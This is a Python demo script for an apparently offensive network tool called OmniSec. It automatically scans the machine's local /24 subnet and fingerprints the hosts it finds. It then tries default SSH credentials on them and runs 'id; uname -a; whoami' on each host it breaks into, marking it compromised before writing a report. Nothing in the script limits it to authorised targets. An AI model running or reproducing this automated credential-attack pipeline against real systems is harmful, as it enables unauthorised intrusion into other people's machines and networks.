"""
Automated demonstration of OmniSec capabilities.
 Runs: discover → fingerprint → SSH exploit → report
"""

from omnisec_engine import OmniSecEngine
import sys

def main():
    print("\n[*] OmniSec Automated Demo")
    print("-" * 60)
    
    engine = OmniSecEngine()
    
    # Target network: use local /24
    net = f"{engine.local_ip.rsplit('.', 2)[0]}.0/24"
    print(f"[*] Target network: {net}")
    
    # Step 1: Discover
    print("[*] Discovery phase...")
    devices = engine.discover_devices(net, exhaustive=False)
    print(f"    Discovered {len(devices)} hosts")
    
    # Step 2: Fingerprint
    print("[*] Fingerprinting...")
    for dev in devices:
        engine.fingerprint_device(dev)
    print(f"    Fingerprinted {engine.stats['fingerprinted']} devices")
    
    # Show device details
    print("\nDiscovered Devices:")
    print(f"{'IP':<18} {'OS':<20} {'SSH':<6} {'Open Ports'}")
    print("-" * 60)
    for dev in sorted(devices, key=lambda d: d.ip):
        ssh = "YES" if dev.ssh_enabled else "no"
        ports = ", ".join(str(p) for p in list(dev.open_ports.keys())[:8])
        print(f"{dev.ip:<18} {dev.os:<20} {ssh:<6} {ports}")
    
    # Step 3: SSH Exploit (attempt default creds on SSH-enabled hosts)
    print("\n[*] Exploitation phase (SSH default credentials)...")
    ssh_targets = [d for d in devices if d.ssh_enabled and not d.can_access]
    print(f"    {len(ssh_targets)} SSH hosts to test")
    
    for dev in ssh_targets:
        creds = engine._try_ssh_creds(dev)
        if creds:
            dev.access_credentials = creds
            dev.access_method = "ssh"
            dev.can_access = True
            # Immediate post-exploit info grab
            try:
                import paramiko
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(dev.ip, username=creds[0], password=creds[1], timeout=5)
                _, stdout, _ = client.exec_command("id; uname -a; whoami", timeout=5)
                out = stdout.read().decode(errors='replace').strip()
                dev.shell_output["initial"] = out
                dev.is_compromised = True
                dev.session_id = f"ssh_{dev.ip.replace('.','_')}"
                client.close()
                print(f"    [+] Compromised {dev.ip} as {creds[0]}")
            except Exception as e:
                print(f"    [-] {dev.ip}: auth succeeded but command exec failed: {e}")
        else:
            print(f"    [-] {dev.ip}: no default SSH credentials")
    
    compromised = [d for d in devices if d.is_compromised]
    print(f"\n[+] Compromised: {len(compromised)} hosts")
    
    # Step 4: Generate report
    print("[*] Generating report...")
    report_path = engine.generate_report("txt")
    print(f"[+] Report: {report_path}")
    
    # Summary
    engine.print_summary()
    
    # Save state
    state = engine.save_state()
    print(f"[+] State saved: {state}")
    
    print("\n[*] Demo complete. Use 'python omnisec.py' for interactive mode.")
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Cancelled")
        sys.exit(0)